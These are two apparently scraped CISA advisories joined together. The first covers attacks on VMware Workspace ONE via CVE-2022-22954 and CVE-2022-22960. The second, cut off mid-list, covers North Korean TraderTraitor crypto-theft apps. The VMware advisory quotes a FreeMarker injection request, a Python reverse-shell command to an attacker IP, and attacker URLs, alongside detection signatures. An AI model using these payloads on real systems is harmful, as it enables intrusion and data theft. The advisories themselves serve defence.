The Cybersecurity and Infrastructure Security Agency (CISA) is releasing this CSA to warn organizations that malicious cyber actors, likely advanced persistent threat (APT) actors, are exploiting CVE-2022-22954 and CVE-2022-22960 separately and in combination. These vulnerabilities affect certain versions of VMware Workspace ONE Access, VMware Identity Manager (vIDM), VMware vRealize Automation (vRA), VMware Cloud Foundation, and vRealize Suite Lifecycle Manager. Exploiting these vulnerabilities permits malicious actors to trigger a server-side template injection that may result in remote code execution (RCE) (CVE-2022-22954) or escalation of privileges to root (CVE-2022-22960). 
VMware released updates for both vulnerabilities on April 6, 2022, and, according to a trusted third party, malicious cyber actors were able to reverse engineer the updates to develop an exploit within 48 hours and quickly began exploiting the disclosed vulnerabilities in unpatched devices. CISA was made aware of this exploit a week later and added CVE-2022-22954 and CVE-2022-22960 to its catalog of Known Exploited Vulnerabilities on April 14 and April 15, respectively. In accordance with Binding Operational Directive (BOD) 22-01, Reducing the Significant Risk of Known Exploited Vulnerabilities, federal agencies were required to apply updates for CVE-2022-22954 and CVE-2022-22960 by May 5, and May 6, 2022, respectively
Note: based on this activity, CISA expects malicious cyber actors to quickly develop a capability to exploit newly released vulnerabilities CVE-2022-22972 and CVE-2022-22973 in the same impacted VMware products. In response, CISA has released, Emergency Directive (ED) 22-03 Mitigate VMware Vulnerabilities, which requires emergency action from Federal Civilian Executive Branch agencies to either immediately implement the updates in VMware Security Advisory VMSA-2022-0014 or remove the affected software from their network until the updates can be applied.
CISA has deployed an incident response team to a large organization where the threat actors exploited CVE-2022-22954. Additionally, CISA has received information—including IOCs—about observed exploitation at multiple other large organizations from trusted third parties.
This CSA provides IOCs and detection signatures from CISA as well as from trusted third parties to assist administrators with detecting and responding to this activity. 
Update June 2, 2022:
This CSA also provides TTPs of this activity from trusted third parties to assist administrators with detecting and responding to this activity. 
Update End
Due to the rapid exploitation of these vulnerabilities, CISA strongly encourages all organizations with internet-facing affected systems—that did not immediately apply updates—to assume compromise and initiate threat hunting activities using the detection methods provided in this CSA. If potential compromise is detected, administrators should apply the incident response recommendations included in this CSA.
Download the PDF version of this report (pdf, 349kb).
For a downloadable copy of IOCs, see AA22-138B.stix. 

Technical Details

CISA has deployed an incident response team to a large organization where the threat actors exploited CVE-2022-22954. Additionally, CISA has received information about observed exploitation of CVE-2022-22954 and CVE-2022-22960 by multiple threat actors at multiple other large organizations from trusted third parties.

CVE-2022-22954 enables an actor with network access to trigger a server-side template injection that may result in RCE. This vulnerability affects the following products:,1,

VMware Workspace ONE Access, versions 21.08.0.1, 21.08.0.0, 20.10.0.1, 20.10.0.0
vIDM versions 3.3.6, 3.3.5, 3.3.4, 3.3.3
VMware Cloud Foundation, 4.x
vRealize Suite LifeCycle Manager, 8.x


CVE-2022-22960 enables a malicious actor with local access to escalate privileges to root due to improper permissions in support scripts. This vulnerability affects the following products:,2,

VMware Workspace ONE Access, versions 21.08.0.1, 21.08.0.0, 20.10.0.1, 20.10.0.0
vIDM, versions 3.3.6, 3.3.5, 3.3.4, 3.3.3
vRA, version 7.6 
VMware Cloud Foundation, 3.x, 4.x, 
vRealize Suite LifeCycle Manager, 8.x



According to trusted third-party reporting, threat actors may chain these vulnerabilities. At one compromised organization, on or around April 12, 2022, an unauthenticated actor with network access to the web interface leveraged CVE-2022-22954 to execute an arbitrary shell command as a VMware user. The actor then exploited CVE-2022-22960 to escalate the user’s privileges to root. With root access, the actor could wipe logs, escalate permissions, and move laterally to other systems. 
Update June 2, 2022:
For more information about this compromised organization, see the Victim 1 section.
Update End
Threat actors have dropped post-exploitation tools, including the Dingo J-spy webshell, a publicly available webshell that includes command execution, a file manager, a database manager, and a port scanner. During incident response activities, CISA observed, on or around April 13, 2022, threat actors leveraging CVE-2022-22954 to drop the Dingo J-spy webshell. Around the same period, a trusted third party observed threat actors leveraging CVE-2022-22954 to drop the Dingo J-spy webshell at one other organization. According to the third party, the actors may have also dropped the Dingo J-spy webshell at a third organization. Note: analysis of the first compromise and associated malware is ongoing, and CISA will update information about this case as we learn more.
Update June 2, 2022:
The following sections include additional information, including IOCs and TTPs, from trusted third parties about two confirmed compromises. See the appendix for TTPs in this CSA mapped to the MITRE ATT&CK for Enterprise framework.
Victim 1 
The trusted third party assesses that multiple threat actors (referred to as Threat Actor 1,TA1, and Threat Actor 2,TA2,) gained access to a public-facing server running VMWare Workspace ONE Access. TA1 downloaded a malicious shell script, which they used to collect and exfiltrate sensitive data. TA2 interacted with the server (without automation or scripts) and installed multiple webshells and a reverse secure socket (SOCKS) proxy.
Threat Actor 1
On April 12, TA1 exploited CVE 2022-22954, to download, a malicious shell script, from https://20.232.97,.,189/up/80b6ae2cea.sh. 
TA1 first targeted Freemarker—a legitimate application that allows for customized notifications by creating templates—to send the following customized GET request URI to the compromised server,:
GET /catalog-portal/ui/oauth/verify?error=&deviceUdid=%24%7B%22freemarker.template.utility.Execute%22%3Fnew%28%29%28%22cat%20/usr/local/horizon/conf/system-config.properties%22%29%7DHTTP/1.1
The GET request resulted in the server downloading the malicious shell script, 80b6ae2cea,.,sh, to VMware Workspace ONE Access directory /usr/local/horizon/scripts/. TA1 then chained CVE 2022-22960 to the initial exploit to run the shell script with root privileges (,). The script was executed with the SUDO command.
The script, which contained VMware Workspace ONE Access directory paths and file locations, was developed for data exfiltration,. The malicious script collected, sensitive files–including user names, passwords, master keys, and firewall rules–and stored them in a “tar ball” (a “tar ball” is a compressed and zipped file used by threat actors for collection and exfiltration),. The tar ball was located in a VMWare Workspace ONE Access directory: /opt/vmware/horizon/workspace/webapps/SAAS/horizon/images/.
The malicious script then deleted evidence of compromise, by modifying logs to their original state and deleting files,. TA1 deleted many files and logs, including fd86ald0.pem,  localhost_access logs, logs associated with the VMWare Horizon application, and greenbox logs for the date of activity (April 12).  
Note: CISA received a similar malicious Bash script for analysis from a trusted third party at a different known compromise. See Victim 2 section for more information.
On April 12, TA1 also downloaded jtest.jsp, a JSP webshell, to the server’s web directory /SAAS/Horizon/js-lib/ from IP address 186.233.187,.,245.
TA1 returned to the server on April 12 to collect sensitive data stored in the “tar ball” by GET request.
Threat Actor 2
On April 13 and 14, TA2 sent many GET requests to the server exploiting—or attempting to exploit—CVE 2022-22954 to obtain RCE, upload binaries, and upload webshells, for persistence,.

On April 13, TA2 attempted to download a webshell app.jsp (MD5 4cd8366345ad4068feca4d417738b4bd) from IP address 51.79.171,.,53. app.jsp is a publicly available, webshell known as Godzilla.
On April 13, TA2 downloaded a JSP webshell (MD 5 F8FF5C72E8FFA2112B01802113148BD1) from http://84.38.133,.,149/img/icon1.gif.
On April 13, TA2 sent thousands of Unix commands, from IP address 84.38.133,.,149, some of which enabled TA2 to view /etc/passwd and /etc/shadow password files (,). The Unix commands included whoami, id, and cat.

The trusted third party found two copies of the Dingo J-spy webshell (MD5 5b0bfda04a1e0d8dcb02556dc4e56e6a) in web directories: horizon_all.jsp was in the /opt/vmware/horizon/workspace/webapps/SAAS/horizon/portal/ web directory and jquery.jsp was in the /webapps/cas/static/ directory. The third party was unable to determine how and when the webshells were created. TA2 used POST requests to communicate with the Dingo J-spy webshells. The commands and output were encrypted with an XOR key,.
On April 14, TA2 downloaded a reverse SOCKS proxy,. TA2 first sent a GET request with the CHMOD command to change the permissions of .tmp12865xax, a hidden file in the /tmp directory,. The actor then downloaded a binary (MD5  dc88c5fe715b5f706f9fb92547da948a) from https://github,.,com/kost/revsocks/releases/download/v1.1.0/revsocks_linux_amd64. The binary is a reverse socks5 tunneling binary with TLS/SSL support and connects to https://149.248.35,.,200.sslip.io.
Additional Threat Actor Activity
The trusted third party observed additional threat actor activity that does not seem to be related to TA1 or TA2. On 13 April, IP address 172.94.89,.,112 attempted to connect a reverse shell on the compromised server to IP Address 100.14.239,.,83 on port 5410. The threat actor used the following command:
freemarker.template.utility.Execute\""?new()(\""/usr/bin/python3.7 -c  \\'importsocket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s. connect((\\\""100,.,14,.,239,.,83\\\"",5410));os.dup2(s.fileno(),0);  os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(,\\\""/usr/bin/sh\\\"",\\\""- i\\\"",);\\'\"")}  
Victim 2 
CISA received a related malicious Bash script for analysis from a trusted third party. The analyzed script, deployed on or around April 12, exploits CVE 2022-22960 and allows a Horizon user to escalate privileges and execute commands and scripts as a superuser (sudo). The Bash script also allows the user to collect network information and additional information.
The script overwrites the publishCaCert.hzn script on fd86ald0.pem file and executes commands that compress a list of files containing information such as network interface configuration, list of users, passwords, masterkeys, hosts, and domains to a TAR archive. The TAR archive, located in a VMWare Workspace ONE Access directory, /opt/vmware/horizon/workspace/webapps/SAAS/horizon/images/, is assigned read and write permissions to the Horizon web user and read to all users.  
The malicious script deletes evidence of compromise by overwriting publishCaCert.hzn with fd86ald0.pem and then removing fd86ald0.pem.
The trusted third party observed the following IPs downloading, executing, and checking the bash script.

45.72.112,.,245
115.167.53,.,141
191.102.179,.,197
209.127.110,.,126
45.72.85,.,172
192.241.67,.,12

The trusted third party observed the following additional malicious IPs:

20.232.97,.,189 – used for command for control,
194.31.98,.,141 – attempted to download MoneroOcean miner from Github
8.45.41,.,114 – ran cat on a number of files in /usr/local/horizon/conf
85.203.36,.,66 – attempted to pull down a JSP webshell from http://84.38.133,.,149/img/icon.gif

Update End
Detection Methods
Signatures
Note: servers vulnerable to CVE-2022-22954 may use Hypertext Transfer Protocol Secure (HTTPS) to encrypt client/server communications. Secure Sockets Layer (SSL)/Transport Layer Security (TLS) decryption can be used as a workaround for network-based detection and threat hunting efforts.
The following CISA-created Snort signature may detect malicious network traffic related to exploitation of CVE-2022-22954:
alert tcp any any -> any $HTTP_PORTS (msg:""VMware:HTTP GET URI contains '/catalog-portal/ui/oauth/verify?error=&deviceUdid=':CVE-2022-22954""; sid:1; rev:1; flow:established,to_server; content: ""GET""; http_method; content:""/catalog-portal/ui/oauth/verify?error=&deviceUdid=""; http_uri; reference:cve,2022-22954; reference:url,github.com/sherlocksecurity/VMware-CVE-2022-22954;
reference:url,github.com/tunelko/CVE-2022-22954-PoC/blob/main/CVE-2022-22954.py; priority:2; metadata:service http;)
The following third-party Snort signature may detect exploitation of VMware Workspace ONE Access server-side template injection:
10000001alert tcp $EXTERNAL_NET any -> $HTTP_SERVERS $HTTP_PORTS (msg:""Workspace One Serverside Template Injection"";content:""GET""; http_method; content:""freemarker.template.utility.Execute"";nocase; http_uri; priority:1; sid:;rev:1;)
Update June 2, 2022:
alert tcp $EXTERNAL_NET any -> $HTTP_SERVERS $HTTP_PORTS (msg:""Workspace One Serverside  Template Injection"";content:""GET""; http_method;  content:""freemarker.template.utility.Execute"";nocase; http_uri; priority:1; sid:100000001;rev:1;)  
Update End
The following third-party YARA rule may detect unmodified instances of the Dingo J-spy webshell on infected hosts:
rule dingo_jspy_webshell
{
strings:
$string1 = ""dingo.length""
$string2 = ""command = command.trim""
$string3 = ""commandAction""
$string4 = ""PortScan""
$string5 = ""InetAddress.getLocalHost""
$string6 = ""DatabaseManager""
$string7 = ""ExecuteCommand""
$string8 = ""var command = form.command.value""
$string9 = ""dingody.iteye.com""
$string10 = ""J-Spy ver""
$string11 = ""no permission,die""
$string12 = ""int iPort = Integer.parseInt""
condition:
filesize < 50KB and 12 of ($string*)
}
Note: the Dingo J-spy webshell is an example of post-exploitation tools that actors have used. Administrators should examine their network for any sign of post-exploitation activity.
Update June 2, 2022:
The following third-party YARA rule may detect unmodified instances of the Godzilla webshell on infected hosts:
rule Godzilla_Webshell  
{   
 strings:  
 $string1 = ""TomcatListenerMemShellFromThread""  
 $string2 = ""String xc =""  
 $string3 = ""String pass =""  
 $string4 = ""ServletRequestListener""  
 $string5 = ""cmds = new String""  
 $string6 = ""cmd""  
 $string7 = ""bin/bash""  
 $string8 = ""getInputStream""  
 $string9 = ""javax.crypto.Cipher c = javax.crypto.Cipher.getInstance""  
 $string10 = ""godzilla""  
 condition:  
 filesize < 20KB and 10 of ($string*)  
} 
The following third-party YARA rule may detect unmodified instances of the TomCat JSP webshell on infected hosts:
rule Tomcatjsp_Webshell  
{  
 strings:  
 $string1 = ""ExecShellCmd""  
 $string2 = ""stCommParams""  
 $string3 = ""nKeyOffset = EncryptData""  
 $string4 = ""InputStream is = process.getInputStream""  
 $string5 = ""Process process = Runtime.getRuntime""  
 $string6 = ""ExecBinary""  
 $string7 = ""byte bzKey""  
 $string8 = ""nKeyOffset++""  
 $string9 = ""HttpServletRequest request, HttpServletResponse response""   $string10 = ""connect_test cmd""  
 $string11 = ""exec cmd""  
 $string12 = ""file upload""  
 condition:  
 filesize < 25KB and 12 of ($string*)  
} 
 
The following third-party YARA rule may detect unmodified instances of the reverse SOCKS proxy on infected hosts.
rule reversesocks_tool  
{  
 md5 = ""dc88c5fe715b5f706f9fb92547da948a""   strings:  
 $string1 = ""revsocks""  
 $string2 = ""-connect""  
 $string3 = ""client:8080 -pass test""  
 $string4 = ""RSA TESTING KEY""  
 $string5 = ""SETTINGS_MAX_CONCURRENT_STREAMS""   $string6 = ""Start on the server:""  
 $string7 = ""closing connection""  
 $string8 = ""socks 127.0.0.1:1080""  
 $string9 = ""revsocks -listen :8080""  
 condition:  
 uint16(0) == 0x457F and filesize < 6MB and 8 of ($string*)  } 
Update End
Behavioral Analysis and Indicators of Compromise
Administrators should conduct behavioral analysis on root accounts of vulnerable systems by: 

Using the indicators listed in table 1 to detect potential malicious activity.
Reviewing systems logs and gaps in logs.
Reviewing abnormal connections to other assets.
Searching the command-line history.
Auditing running processes.
Reviewing local user accounts and groups.  
Auditing active listening ports and connections.

Table 1: Third-party IOCs for Exploitation of CVE-2022-22954 and CVE-2022-22960 
Used around April 12–14, 2022 (Updated June 2, 2022)
 

 
Update May 25, 2022: see Palo Alto Networks Unit 42 Threat Brief: VMware Vulnerabilities Exploited in the Wild (CVE-2022-22954 and Others) for additional IOCs to detect possible exploitation or compromise. Note: due to the urgency to share this information, CISA has not yet validated this content.
Incident Response
If administrators discover system compromise, CISA recommends they:

Immediately isolate affected systems. 
Collect and review relevant logs, data, and artifacts.
Consider soliciting support from a third-party incident response organization to provide subject matter expertise, ensure the actor is eradicated from the network, and avoid residual issues that could enable follow-on exploitation.
Report incidents to CISA via CISA’s 24/7 Operations Center (report@cisa.gov or 888-282-0870).


Mitigations

CISA recommends organizations update impacted VMware products to the latest version or remove impacted versions from organizational networks. CISA does not endorse alternative mitigation options. As noted in ED 22-03 Mitigate VMware Vulnerabilities, CISA expects malicious cyber actors to quickly develop a capability to exploit newly released vulnerabilities CVE-2022-22972 and CVE-2022-22973 in the same impacted VMware products. ED 22-03 directs all Federal Civilian Executive Branch agencies to enumerate all instances of impacted VMware products and deploy updates in VMware Security Advisory VMSA-2022-0014 or to remove the affected software from the agency network until the updates can be applied.
Resources

ED 22-03 Mitigate VMware Vulnerabilities
VMware Security Advisory VMSA-2022-0011
VMware Security Advisory VMSA-2022-0014
Update May 25, 2022: Palo Alto Networks Unit 42 Threat Brief: VMware Vulnerabilities Exploited in the Wild (CVE-2022-22954 and Others)

Contact Information 
CISA encourages recipients of this CSA to report incidents to CISA via CISA’s 24/7 Operations Center (report@cisa.gov or 888-282-0870)
References,1, VMware Security Advisory VMSA-2022-0011,2, Ibid
Update June 2, 2022:
Appendix: Mitre  Att&ck TTPS
Threat actors and their malware have used the TTPs in table 1 when exploiting CVE-2022-22954 and/or CVE-2022-22960 and conducting related activity. See the ATT&CK for Enterprise framework for all referenced threat actor tactics and techniques.
Table 2: MITRE ATT&CK TTPs

Update End

References,1, VMware Security Advisory VMSA-2022-0011,2, Ibid

Revisions

Initial Version: May 18, 2022|May 25, 2022: Added Industry Resource|June 2, 2022: Added Detection Signatures, IOCs, and TTPs






This product is provided subject to this Notification and this Privacy & Use policy.


",https://www.cisa.gov/news-events/cybersecurity-advisories/aa22-138b
49,"




Summary

Actions to take today to mitigate cyber threats to cryptocurrency:• Patch all systems.• Prioritize patching known exploited vulnerabilities.• Train users to recognize and report phishing attempts.• Use multifactor authentication.
The Federal Bureau of Investigation (FBI), the Cybersecurity and Infrastructure Security Agency (CISA), and the U.S. Treasury Department (Treasury) are issuing this joint Cybersecurity Advisory (CSA) to highlight the cyber threat associated with cryptocurrency thefts and tactics used by a North Korean state-sponsored advanced persistent threat (APT) group since at least 2020. This group is commonly tracked by the cybersecurity industry as Lazarus Group, APT38, BlueNoroff, and Stardust Chollima. For more information on North Korean state-sponsored malicious cyber activity, visit https://www.us-cert.cisa.gov/northkorea.
The U.S. government has observed North Korean cyber actors targeting a variety of organizations in the blockchain technology and cryptocurrency industry, including cryptocurrency exchanges, decentralized finance (DeFi) protocols, play-to-earn cryptocurrency video games, cryptocurrency trading companies, venture capital funds investing in cryptocurrency, and individual holders of large amounts of cryptocurrency or valuable non-fungible tokens (NFTs). The activity described in this advisory involves social engineering of victims using a variety of communication platforms to encourage individuals to download trojanized cryptocurrency applications on Windows or macOS operating systems. The cyber actors then use the applications to gain access to the victim’s computer, propagate malware across the victim’s network environment, and steal private keys or exploit other security gaps. These activities enable additional follow-on activities that initiate fraudulent blockchain transactions.
The U.S. government previously published an advisory about North Korean state-sponsored cyber actors using AppleJeus malware to steal cryptocurrency: AppleJeus: Analysis of North Korea’s Cryptocurrency Malware. The U.S. government has also previously published advisories about North Korean state-sponsored cyber actors stealing money from banks using custom malware:

HIDDEN COBRA – FASTCash Campaign
FASTCash 2.0: North Korea’s BeagleBoyz Robbing Banks

This advisory provides information on tactics, techniques, and procedures (TTPs) and indicators of compromise (IOCs) to stakeholders in the blockchain technology and cryptocurrency industry to help them identify and mitigate cyber threats against cryptocurrency. 
Click here for a PDF version of this report. 
Click here for STIX.

Technical Details

Threat Update
The U.S. government has identified a group of North Korean state-sponsored malicious cyber actors using tactics similar to the previously identified Lazarus Group (see AppleJeus: Analysis of North Korea’s Cryptocurrency Malware). The Lazarus Group used AppleJeus trojanized cryptocurrency applications targeting individuals and companies—including cryptocurrency exchanges and financial services companies—through the dissemination of cryptocurrency trading applications that were modified to include malware that facilitates theft of cryptocurrency. As of April 2022, North Korea’s Lazarus Group actors have targeted various firms, entities, and exchanges in the blockchain and cryptocurrency industry using spearphishing campaigns and malware to steal cryptocurrency. These actors will likely continue exploiting vulnerabilities of cryptocurrency technology firms, gaming companies, and exchanges to generate and launder funds to support the North Korean regime. 
Tactics, Techniques and Procedures
Intrusions begin with a large number of spearphishing messages sent to employees of cryptocurrency companies—often working in system administration or software development/IT operations (DevOps)—on a variety of communication platforms. The messages often mimic a recruitment effort and offer high-paying jobs to entice the recipients to download malware-laced cryptocurrency applications, which the U.S. government refers to as ""TraderTraitor.""
The term TraderTraitor describes a series of malicious applications written using cross-platform JavaScript code with the Node.js runtime environment using the Electron framework. The malicious applications are derived from a variety of open-source projects and purport to be cryptocurrency trading or price prediction tools. TraderTraitor campaigns feature websites with modern design advertising the alleged features of the applications (see figure 1).
 

Figure 1: Screenshot of CryptAIS website
The JavaScript code providing the core functions of the software is bundled with Webpack. Within the code is a function that purports to be an “update,” with a name such as UpdateCheckSync(), that downloads and executes a malicious payload (see figure 2). 
The update function makes an HTTP POST request to a PHP script hosted on the TraderTraitor project’s domain at either the endpoint /update/ or /oath/checkupdate.php. In recent variants, the server’s response is parsed as a JSON document with a key-value pair, where the key is used as an AES 256 encryption key in Cipher Block Chaining (CBC) or Counter (CTR) mode to decrypt the value. The decrypted data is written as a file to the system’s temporary directory, as provided by the os.tmpdir() method of Node.js, and executed using the child_process.exec() method of Node.js, which spawns a shell as a child process of the current Electron application. The text “Update Finished” is then logged to the shell for the user to see.
Observed payloads include updated macOS and Windows variants of Manuscrypt, a custom remote access trojan (RAT), that collects system information and has the ability to execute arbitrary commands and download additional payloads (see North Korean Remote Access Tool: COPPERHEDGE). Post-compromise activity is tailored specifically to the victim’s environment and at times has been completed within a week of the initial intrusion.  
 

Figure 2: Screenshot depicting the UpdateCheckSync() and supporting functions bundled within 60b3cfe2ec3100caf4afde734cfd5147f78acf58ab17d4480196831db4aa5f18 associated with DAFOM
Indicators of Compromise
DAFOMDAFOM purports to be a “cryptocurrency portfolio application.” A Mach-O binary packaged within the Electron application was signed by an Apple digital signature issued for the Apple Developer Team W58CYKFH67. The certificate associated with Apple Developer Team W58CYKFH67 has been revoked. A metadata file packaged in the DAFOM application provided the URL hxxps://github[.]com/dafomdev for bug reports. As of April 2022, this page was unavailable.
 
dafom[.]dev
Information as of February 2022:IP Address: 45.14.227[.]58Registrar: NameCheap, Inc.Created: February 7, 2022Expires: February 7, 2023
 
60b3cfe2ec3100caf4afde734cfd5147f78acf58ab17d4480196831db4aa5f18
Tags: dropper macosName: DAFOM-1.0.0.dmgSize: 87.91 MB (92182575 bytes)MD5: c2ea5011a91cd59d0396eb4fa8da7d21SHA-1: b2d9ca7b6d1bbbe4864ea11dfca343b7e15597d8SHA-256: 60b3cfe2ec3100caf4afde734cfd5147f78acf58ab17d4480196831db4aa5f18ssdeep: 1572864:LGLBnolF9kPEiKOabR2QEs1B1/LuUQrbecE6Xwijkca/pzpfaLtIP:LGVnoT9kPZK9tVEwBxWbecR5Faxzpf0M
 
TokenAISTokenAIS purports to help “build a portfolio of AI-based trading” for cryptocurrencies. Mach-O binaries packaged within the Electron application contained an Apple digital signature issued for the Apple Developer Team RN4BTXA4SA. The certificate associated with Apple Developer Team RN4BTXA4SA has been revoked. The application requires users to “register” an account by entering an email address and a password to use its features. The malicious TraderTraitor code is a Node.js function called UpdateCheckSync() located in a file named update.js, which is bundled in a file called renderer.prod.js, which is in an archive called app.asar. This function passes the email address that the user provided and the system platform to the C2 server, decrypts the response using AES 256 in CBC mode with the hardcoded initialization vector (IV) !@34QWer%^78TYui and a key provided in the response, then writes the decrypted data to a file and executes it in a new shell.
 
tokenais[.]com
Information as of January 2022:IP Address: 199.188.103[.]115Registrar: NameCheap, Inc.Created: January 27, 2022Expires: January 27, 2023
 
5b40b73934c1583144f41d8463e227529fa7157e26e6012babd062e3fd7e0b03
Tags: dropper macosName: TokenAIS.app.zipSize: 118.00 MB (123728267 bytes)MD5: 930f6f729e5c4d5fb52189338e549e5eSHA-1: 8e67006585e49f51db96604487138e688df732d3SHA-256: 5b40b73934c1583144f41d8463e227529fa7157e26e6012babd062e3fd7e0b03ssdeep: 3145728:aMFJlKVvw4+zLruAsHrmo5Vvw4+zLruAsHrmob0dC/E:aUlKtw4+/r2HNtw4+/r2HnMCM
 
CryptAISCryptAIS uses the same language as TokenAIS to advertise that it “helps build a portfolio of AI-based trading.” It is distributed as an Apple Disk Image (DMG) file that is digitally signed by an Apple digital signature issued for the Apple Developer Team CMHD64V5R8. The certificate associated with Apple Developer Team CMHD64V5R8 has been revoked. The application requires users to “register” an account by entering an email address and a password to use its features. The malicious TraderTraitor code is a Node.js function called UpdateCheckSync() located in a file named update.js, which is bundled in a file called renderer.prod.js, which is in an archive called app.asar. This function passes the email address that the user provided and the system platform to the C2 server, decrypts the response using AES 256 in CTR mode and a key provided in the response, then writes the decrypted data to a file and executes it in a new shell.
 
cryptais[.]com
Information as of August 2021:IP Address: 82.102.31.14Registrar: NameCheap, Inc.Created: August 2, 2021Expires: August 2, 2022
 
f0e8c29e3349d030a97f4a8673387c2e21858cccd1fb9ebbf9009b27743b2e5b
Tags: dropper macosName: CryptAIS[.]dmgSize: 80.36 MB (84259810 bytes)MD5: 4e5ebbecd22c939f0edf1d16d68e8490SHA-1: f1606d4d374d7e2ba756bdd4df9b780748f6dc98SHA-256: f0e8c29e3349d030a97f4a8673387c2e21858cccd1fb9ebbf9009b27743b2e5bssdeep: 1572864:jx9QOwiLDCUrJXsKMoGTwiCcKFI8jmrvGqjL2hX6QklBmrZgkZjMz+dPSpR0Xcpk:F9QOTPCUrdsKEw3coIg2Or6XBmrZgkZw
 
AlticGOAlticGO was observed packaged as Nullsoft Scriptable Install System (NSIS) Windows executables that extracted an Electron application packaged for Windows. These executables contain a simpler version of TraderTraitor code in a function exported as UpdateCheckSync() located in a file named update.js, which is bundled in renderer.prod.js, which is in the app.asar archive. The function calls an external function located in a file node_modules/request/index.js bundled in renderer.prod.js to make an HTTP request to hxxps://www.alticgo[.]com/update/. One AlticGO sample, e3d98cc4539068ce335f1240deb1d72a0b57b9ca5803254616ea4999b66703ad, instead contacts hxxps://www.esilet[.]com/update/ (see below for more information about Esilet). Some image resources bundled with the application included the CreAI Deck logo (see below for more information about CreAI Deck). The response is written to disk and executed in a new shell using the child_process.exec() method in Node.js. Unlike newer versions of TraderTraitor, there is no mechanism to decrypt a payload.
 
alticgo[.]com
Information as of August 2020:IP Address: 108.170.55[.]202Registrar: NetEarth One Inc.Created: August 8, 2020Expires: August 8, 2021
 
765a79d22330098884e0f7ce692d61c40dfcf288826342f33d976d8314cfd819
Tags: dropper peexe nsisName: AlticGO.exeSize: 43.54 MB (45656474 bytes)MD5: 1c7d0ae1c4d2c0b70f75eab856327956SHA-1: f3263451f8988a9b02268f0fb6893f7c41b906d9SHA-256: 765a79d22330098884e0f7ce692d61c40dfcf288826342f33d976d8314cfd819ssdeep: 786432:optZmVDkD1mZ1FggTqqLGAU6JXnjmDQ4YBXpleV0RnJYJKoSuDySLGh7yVPUXi7:opzKDginspAU6JXnJ46X+eC6cySihWVXCompilation timestamp: 2018-12-15 22:26:14 UTC
 
e3d98cc4539068ce335f1240deb1d72a0b57b9ca5803254616ea4999b66703ad
Tags: dropper peexe nsisName: AlticGO_R.exeSize: 44.58 MB (46745505 bytes)MD5: 855b2f4c910602f895ee3c94118e979aSHA-1: ff17bd5abe9f4939918f27afbe0072c18df6db37SHA-256: e3d98cc4539068ce335f1240deb1d72a0b57b9ca5803254616ea4999b66703adssdeep: 786432:LptZmVDkD1mQIiXUBkRbWGtqqLGAU6JXnjmDQ4YBXpleV0RnJYJKoSuDySLGh7yH:LpzKDgzRpWGwpAU6JXnJ46X+eC6cySiICompilation timestamp: 2020-02-12 16:15:17 UTC
 
8acd7c2708eb1119ba64699fd702ebd96c0d59a66cba5059f4e089f4b0914925
Tags: dropper peexe nsisName: AlticGO.exeSize: 44.58 MB (46745644 bytes)MD5: 9a6307362e3331459d350a201ad66cd9SHA-1: 3f2c1e60b5fac4cf1013e3e1fc688be490d71a84SHA-256: 8acd7c2708eb1119ba64699fd702ebd96c0d59a66cba5059f4e089f4b0914925ssdeep: 786432:AptZmVDkD1mjPNDeuxOTKQqqLGAU6JXnjmDQ4YBXpleV0RnJYJKoSuDySLGh7yV7:ApzKDgqPxeuLpAU6JXnJ46X+eC6cySiGCompilation timestamp: 2020-02-12 16:15:17 UTC
 
EsiletEsilet claims to offer live cryptocurrency prices and price predictions. It contains a simpler version of TraderTraitor code in a function exported as UpdateCheckSync() located in a file named update.js, which is bundled in renderer.prod.js, which is in the app.asar archive. The function calls an external function located in a file node_modules/request/index.js bundled in renderer.prod.js to make an HTTP request to hxxps://www.esilet[.]com/update/. The response is written to disk and executed in a new shell using the child_process.exec() method in Node.js. Unlike newer versions of TraderTraitor, there is no mechanism to decrypt a payload. Esilet has been observed delivering payloads of at least two different macOS variants of Manuscrypt, 9d9dda39af17a37d92b429b68f4a8fc0a76e93ff1bd03f06258c51b73eb40efa and dced1acbbe11db2b9e7ae44a617f3c12d6613a8188f6a1ece0451e4cd4205156. 
 

Figure 3: Screenshot of the UpdateCheckSync() function in Esilet
esilet[.]com
Information as of June 2020:IP Address: 104.168.98[.]156Registrar: NameSilo, LLCCreated: June 12, 2020Expires: June 12, 2021
 
greenvideo[.]nl
Likely legitimate but compromised. Information as of April 2022:IP Address: 62.84.240[.]140Registrar: FlexwebhostingCreated: February 26, 2018Expires: Unknown
 
dafnefonseca[.]com
Likely legitimate but compromised. Information as of June 2020:IP Address: 151.101.64[.]119Registrar: PublicDomainRegistry Created: August 27, 2019Expires: August 27, 2022
 
haciendadeclarevot[.]com
Likely legitimate but compromised. Information as of June 2020:IP Address: 185.66.41[.]17Registrar: cdmon, 10DENCEHISPAHARD, S.L.Created: March 2, 2005Expires: March 2, 2023
 
sche-eg[.]org
Likely legitimate but compromised. Information as of June 2020:IP Address: 160.153.235[.]20Registrar: GoDaddy.com, LLCCreated: June 1, 2019Expires: June 1, 2022
 
www.vinoymas[.]ch
Likely legitimate but compromised. Information as of June 2020:IP Address: 46.16.62[.]238Registrar: cdmon, 10DENCEHISPAHARD, S.L.Created: January 24, 2010Expires: Unknown
 
infodigitalnew[.]com
Likely legitimate but compromised. Information as of June 2020:IP Address: 107.154.160[.]132Registrar: PublicDomainRegistryCreated: June 20, 2020Expires: June 20, 2022
 
9ba02f8a985ec1a99ab7b78fa678f26c0273d91ae7cbe45b814e6775ec477598
Tags: dropper macosName: Esilet.dmgSize: 77.90 MB (81688694 bytes) MD5: 53d9af8829a9c7f6f177178885901c01SHA-1: ae9f4e39c576555faadee136c6c3b2d358ad90b9 SHA-256: 9ba02f8a985ec1a99ab7b78fa678f26c0273d91ae7cbe45b814e6775ec477598ssdeep: 1572864:lffyoUnp5xmHVUTd+GgNPjFvp4YEbRU7h8cvjmUAm4Du73X0unpXkU:lfqHBmHo+BPj9CYEshLqcuAX0I0
 
9d9dda39af17a37d92b429b68f4a8fc0a76e93ff1bd03f06258c51b73eb40efa
Tags: trojan machoName: Esilet-tmpzpsb3Size: 510.37 KB (522620 bytes)MD5: 1ca31319721740ecb79f4b9ee74cd9b0SHA-1: 41f855b54bf3db621b340b7c59722fb493ba39a5 SHA-256: 9d9dda39af17a37d92b429b68f4a8fc0a76e93ff1bd03f06258c51b73eb40efassdeep: 6144:wAulcT94T94T97zDj1I/BkjhkbjZ8bZ87ZMSj71obV/7NobNo7NZTb7hMT5ETZ8I:wDskT1UBg2lirFbpR9mJGpmN C2 Endpoints:

